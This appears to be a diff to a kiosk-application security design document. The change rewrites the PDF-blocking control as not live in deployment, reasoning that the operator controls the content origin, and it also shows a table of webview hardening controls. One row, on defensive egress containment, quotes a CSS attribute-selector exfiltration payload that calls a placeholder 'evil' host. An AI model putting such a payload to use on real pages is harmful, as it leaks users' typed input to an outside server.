@@ -707,7 +707,7 @@ their platform phases (P2, P3). **The document-start injection engine ships in P
 | Text selection ActionMode (Android, M7) | override `setCustomSelectionActionModeCallback` (+ process-text) to return an empty ActionMode — the selection floating toolbar (Web-search/Assist/Share/Translate launch external apps) is a distinct mechanism `setOnLongClickListener` does not suppress |
 | Touch keyboard | Android: system IME. **Windows: TabTip does NOT reliably auto-invoke on webview input focus (WebView2Feedback #1887/#460), so P1 ships an explicit TabTip driver OR the bundled JS on-screen keyboard, validated on touch hardware under Assigned Access (PF-02, §12/OD-1).** **Linux (erratum, 2026-08-07 — see below): the bundled JS on-screen keyboard, injected document-start; squeekboard/onboard are NOT usable under the mandated compositor** |
 | Downloads / popups / file pickers | blocked; new windows navigate in place; file picker allowed only via config flag (future) |
-| PDF (M4; §12/OD-8) | default: navigations returning `application/pdf` are **blocked** (`nav.blocked`) — the Edge PDF viewer toolbar exposes Print/Save that bypass `DownloadStarting`. `content.pdf_view=true` routes PDFs through a bundled chrome-less pdf.js viewer instead. Confirm interceptors wired per platform (WebView2 `DownloadStarting`, WebKitGTK `download-started`, Android `setDownloadListener`). **Linux: discharged by construction — WebKitGTK ships no PDF viewer, so the toolbar this control exists to defeat does not exist, and every download is already denied (erratum below). Windows: `scheme_guard::pdf_decision` is written and host-tested but wired to no call site — outstanding P1 debt, not a P2 item.** |
+| PDF (M4; §12/OD-8) | default: navigations returning `application/pdf` are **blocked** (`nav.blocked`) — the Edge PDF viewer toolbar exposes Print/Save that bypass `DownloadStarting`. `content.pdf_view=true` routes PDFs through a bundled chrome-less pdf.js viewer instead. Confirm interceptors wired per platform (WebView2 `DownloadStarting`, WebKitGTK `download-started`, Android `setDownloadListener`). **Not a live control as deployed — see the §7 errata: the content origin is operator-controlled and serves no PDFs, so `pdf_decision` stays unwired on every platform.** |
 | Egress containment (SEC-10) | Native subresource host-allowlist: **every** resource request (not just navigations) checked against `content.allowlist` and cancelled if off-list — WebView2 `WebResourceRequested`, WebKitGTK `resource-load-started`, Android `shouldInterceptRequest` — plus an injected restrictive CSP. Closes CSS/JS exfiltration (e.g. `input[value^="a"]{background:url(https://evil/a)}`, `fetch`, beacon) that never triggers a navigation. Residual gaps (service workers, some preload paths) documented |
 
 **Errata, 2026-08-07 (rev 2.1)** — both raised and ruled in the P2-B…P2-G adversarial
@@ -722,12 +722,16 @@ design review (`docs/superpowers/reviews/2026-08-07-p2b-p2g-adversarial-review/`
   for Windows: a **bundled** JS on-screen keyboard injected at document-start through the
   P1 injection engine, which needs no live-reinjection path and therefore does not depend
   on the `inject_css`/`inject_js` operator knobs (RT-16). Owned by **P2-B**.
-- **PDF, Linux (M4/OD-8).** OD-8's rationale is specific to the Edge PDF viewer's
-  Print/Save toolbar. WebKitGTK has no built-in PDF viewer, and P2-B denies every download
-  at the builder hook, so a PDF navigation on Linux cannot reach a viewer that does not
-  exist. The Linux column is discharged by construction and pinned by a smoke assertion
-  rather than by new enforcement code. This does **not** discharge Windows, where
-  `pdf_decision` remains unwired — tracked as P1 debt.
+- **PDF (M4/OD-8) — not a live control as deployed.** The content origin is
+  operator-controlled and serves no `application/pdf`, so the navigation this control
+  exists to intercept does not occur, and nothing is wired on any platform.
+  `scheme_guard::pdf_decision` stays written, host-tested and unused. Two independent
+  reasons it would not bite on Linux even if content changed: WebKitGTK ships no built-in
+  PDF viewer — the Edge viewer's Print/Save toolbar is OD-8's entire stated rationale —
+  and P2-B denies every download at the builder hook. **The assumption is the deployment
+  owning its content**; if the fleet is ever pointed at a site the operator does not
+  control, M4 becomes live again on Windows first, where the Edge viewer exists. Recorded
+  so the assumption stays visible, not as scheduled work.
 
 ### 7.2 OS-level hardening (deployment gate, per platform)
 
@@ -966,6 +970,6 @@ any of them.
 | OD-5 | **Windows lockdown SKU** (PF-01/03, SEC-07, M8) | (a) mandate Assigned Access/Shell Launcher (Enterprise/IoT/Education) as covering boundary, in-app hook = defense-in-depth (applied); (b) rely on in-app hook only | **(a)** — the in-app hook is documented-unreliable on focused WebView2 and cannot block OS-reserved chords; procurement must target these SKUs |
 | OD-6 | **Config-safety UX** (cfg-02, cfg-05, RT-04) | implicit-allow home URL vs reject-if-mismatch; `content.url` falls back to bootstrap vs required; post-apply self-check + manual canary now vs automated canary system | **implicit-allow home URL, fallback-to-bootstrap, self-check + manual canary now (applied); automated staged rollout = P4** |
 | OD-7 | **Telemetry modelling** (TEL-04, TEL-08) | `generic_node.location` = new `region` field vs reuse `site`; URL redaction default = path / host / full | **add optional `region` (default site); URL redaction default = path-only** (applied) — privacy-first fits shared-kiosk stance + data-protection law |
-| OD-8 | **PDF policy** (M4) | block `application/pdf` by default vs render via bundled pdf.js | **block by default, `content.pdf_view=true` opt-in** (applied) — the Edge PDF viewer's Print/Save bypass download blocking. *2026-08-07: "applied" overstated it — the decision is recorded but wired on neither platform. Linux is discharged by construction (no WebKitGTK PDF viewer, all downloads denied); Windows wiring is outstanding P1 debt. See §7 errata.* |
+| OD-8 | **PDF policy** (M4) | block `application/pdf` by default vs render via bundled pdf.js | **block by default, `content.pdf_view=true` opt-in** (applied) — the Edge PDF viewer's Print/Save bypass download blocking. *2026-08-07: "applied" overstated it — the decision is recorded but wired on neither platform, and stays that way. The deployment controls its content origin and serves no PDFs, so the control has nothing to intercept; the option remains available if that ever changes. See §7 errata.* |
 | OD-9 | **Native non-webview last-resort safe screen** (arch-14) | (a) bounded escalation + `watchdog.safe_mode_failed` CRITICAL only (applied); (b) also build a launcher-owned native text window for engine-level faults | **(a) now; (b) deferred** — a human-readable on-screen message for a fault that usually needs a site visit may not justify per-platform native-render cost |
 | OD-10 | **Goal 1 wording / supported configs** (RT-11) | (a) reword to "identical app behaviour + telemetry; OS lockdown differs per platform" + baseline note (applied); (b) drop X11 and screen-pinning from support entirely | **(a)** — preserves deployment flexibility with clearly-labelled secure baselines; (b) is stricter but removes options some sites need |
